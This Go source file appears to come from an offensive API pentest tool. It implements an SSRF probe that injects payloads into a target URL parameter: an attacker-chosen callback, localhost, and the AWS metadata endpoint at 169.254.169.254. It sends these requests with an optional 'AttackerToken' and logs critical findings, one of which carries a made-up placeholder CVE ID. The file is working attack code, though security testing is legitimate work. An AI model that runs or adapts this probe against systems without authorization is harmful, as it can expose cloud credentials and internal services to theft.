package logic

import (
	"fmt"
	"net/http"
	"net/url"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
)

type SSRFContext struct {
	TargetURL string
	ParamName string
	Callback  string
}

func (s *SSRFContext) Probe() {
	// FIX: Removed pterm
	utils.TacticalLog("[cyan]API7: Server-Side Request Forgery Tracker Started[-]")

	client := *GlobalClient
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	payloads := []string{
		s.Callback,
		"http://127.0.0.1:80",
		"http://169.254.169.254/latest/meta-data/",
	}

	for _, payload := range payloads {
		if payload == "" {
			continue
		}

		u, _ := url.Parse(s.TargetURL)
		q := u.Query()
		q.Set(s.ParamName, payload)
		u.RawQuery = q.Encode()
		fuzzedURL := u.String()

		req, _ := http.NewRequest("GET", fuzzedURL, nil)
		if CurrentSession.AttackerToken != "" {
			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", CurrentSession.AttackerToken))
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode < 500 {
			if payload == "http://127.0.0.1:80" || payload == "http://169.254.169.254/latest/meta-data/" {
				utils.RecordFinding(db.Finding{
					Phase:      "PHASE IV: INJECTION",
					Target:     s.TargetURL,
					Details:    fmt.Sprintf("SSRF Internal Access: %s", payload),
					Status:     "CRITICAL",
					OWASP_ID:   "API7:2023",
					MITRE_ID:   "T1071.001",
					NIST_Tag:   "DE.CM",
					CVE_ID:     "CVE-202X-SSRF-CLOUD",
					CVSS_Score: "9.1", // CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
				})
			} else {
				utils.RecordFinding(db.Finding{
					Phase:      "PHASE IV: INJECTION",
					Target:     s.TargetURL,
					Details:    "SSRF Callback Triggered",
					Status:     "POTENTIAL CALLBACK",
					OWASP_ID:   "API7:2023",
					MITRE_ID:   "T1213",
					NIST_Tag:   "DE.AE",
					CVE_ID:     "N/A",
					CVSS_Score: "0.0",
				})
			}
		}
	}
}
